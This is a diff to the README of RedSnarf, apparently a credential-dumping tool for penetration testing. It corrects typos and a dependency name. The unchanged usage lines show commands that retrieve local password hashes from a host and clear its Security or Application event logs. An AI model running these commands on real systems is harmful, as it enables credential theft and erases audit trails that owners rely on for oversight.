@@ -40,7 +40,7 @@ RedSnarf Usage
 
 Requirements:
 Impacket v0.9.16-dev - https://github.com/CoreSecurity/impacket.git
-CredRetrieve 7 - https://github.com/Neohapsis/credRetrieve7
+CredDump7 - https://github.com/Neohapsis/creddump7
 Lsass Retrieval using procdump - https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx
 Netaddr (0.7.12) - easy_install install netaddr
 Termcolor (1.1.0) - easy_install termcolor
@@ -53,10 +53,10 @@ Show Help
 Retrieve Local Hashes
 =======================
 
-Retrieve Local Hashes from a single machine using weak local credetials and clearing the Security event log
+Retrieve Local Hashes from a single machine using weak local credentials and clearing the Security event log
 ./redsnarf.py -H ip=10.0.0.50 -uC security
 
-Retrieve Local Hashes from a single machine using weak local credetials and clearing the application event log
+Retrieve Local Hashes from a single machine using weak local credentials and clearing the application event log
 ./redsnarf.py -H ip=10.0.0.50 -uC application
 
 Retrieve Local Hashes from a single machine using local administrator credentials
